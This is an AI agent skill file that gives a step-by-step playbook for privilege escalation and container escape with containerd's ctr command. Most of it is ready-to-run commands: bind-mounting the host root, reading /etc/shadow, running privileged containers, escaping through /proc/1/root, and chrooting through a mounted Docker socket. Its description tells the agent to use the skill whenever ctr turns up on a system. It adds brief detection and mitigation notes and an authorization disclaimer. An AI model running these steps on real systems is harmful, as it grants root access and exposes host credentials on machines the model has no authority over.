---
name: containerd-privilege-escalation
description: How to perform privilege escalation using containerd's ctr command during authorized security assessments. Use this skill whenever the user mentions containerd, ctr command, container escape, privilege escalation in containerized environments, or needs to test container security. Make sure to use this skill when you find the ctr binary on a system during penetration testing or security audits.
---

# Containerd (ctr) Privilege Escalation

This skill helps you perform privilege escalation using containerd's `ctr` command during authorized security assessments. Containerd is a container runtime that manages container lifecycle, and its CLI tool `ctr` can be exploited if accessible to unprivileged users.

## When to use this skill

Use this skill when:
- You discover the `ctr` command is available on a system during security testing
- You need to escalate privileges in a containerized environment
- You're assessing container runtime security
- You have access to containerd but not root privileges

## Prerequisites

Before attempting these techniques:
- You have authorized permission to test the system
- The `ctr` command is available (`which ctr`)
- You have access to at least one container image

## Technique 1: Mount Host Root to Container

This technique mounts the host's root filesystem into a container, giving you access to all host files.

### Step 1: Verify ctr is available

```bash
which ctr
# Expected output: /usr/bin/ctr or similar path
```

### Step 2: List available images

```bash
ctr image list
```

This shows all container images available to containerd. Look for images with shells (ubuntu, alpine, debian, etc.).

### Step 3: Run container with host root mounted

```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t <image-name> <container-name> bash
```

**Why this works:** The `--mount` flag with `type=bind` and `options=rbind` recursively binds the host root (`/`) to the container root. Once inside, you can access any file on the host system.

**Example:**
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```

### Step 4: Access host files

Once inside the container:
```bash
# You're now in a container with host root mounted
ls /etc/passwd      # Host's passwd file
cat /etc/shadow     # Host's shadow file (if readable)
# You can modify host files, read credentials, etc.
```

## Technique 2: Privileged Container Escape

This technique runs a container with privileged mode and escapes to the host.

### Step 1: Run privileged container

```bash
ctr run --privileged --net-host -t <image-name> <container-name> bash
```

**Why this works:** The `--privileged` flag grants the container all Linux capabilities, and `--net-host` shares the host's network namespace. This gives you near-root access on the host.

**Example:**
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```

### Step 2: Escape from privileged container

Once inside the privileged container, you can use various techniques to fully escape to the host:

#### Option A: Mount host filesystem
```bash
# Mount the host's root filesystem
mount -t overlay overlay /mnt
# Or directly access if cgroups are accessible
cd /proc/1/root/
```

#### Option B: Use Docker socket (if available)
```bash
# If Docker socket is mounted, use it to run privileged containers
docker run -v /:/host --rm -it alpine chroot /host
```

#### Option C: Exploit kernel capabilities
```bash
# With privileged mode, you can mount filesystems
mount -t proc none /proc
mount -t sysfs none /sys
# Then access host resources
```

## Verification

After escaping, verify you're on the host:
```bash
# Check hostname
hostname

# Check if you can see host processes
ps aux

# Check mount points
mount | grep -v container

# Try to access host-specific files
cat /etc/issue
```

## Important Considerations

### Security Implications
- These techniques demonstrate why containerd should not be accessible to unprivileged users
- Proper containerd configuration should restrict ctr access
- SELinux/AppArmor policies can mitigate these risks

### Detection
- Monitor for `ctr run` commands with `--mount` or `--privileged` flags
- Alert on unusual container image usage
- Track container runtime access patterns

### Mitigation
- Restrict ctr binary permissions (only root should access)
- Use containerd's authorization plugins
- Implement network policies
- Regular security audits of container configurations

## Troubleshooting

### "ctr: command not found"
Containerd may not be installed, or ctr is in a non-standard location:
```bash
find / -name ctr -type f 2>/dev/null
```

### "permission denied" when running containers
You may need to be in the docker group or have specific capabilities:
```bash
# Check your groups
groups
# Check containerd socket permissions
ls -la /run/containerd/
```

### No images available
If `ctr image list` returns empty, you may need to pull an image first:
```bash
ctr image pull docker.io/library/alpine:latest
```

## References

- [Containerd Documentation](https://github.com/containerd/containerd)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Container Escape Techniques](https://github.com/cyberark/Container-Escape)

## Ethical Use Notice

This skill is intended for authorized security testing and educational purposes only. Always obtain proper authorization before testing container security on any system. Unauthorized access to computer systems is illegal and unethical.
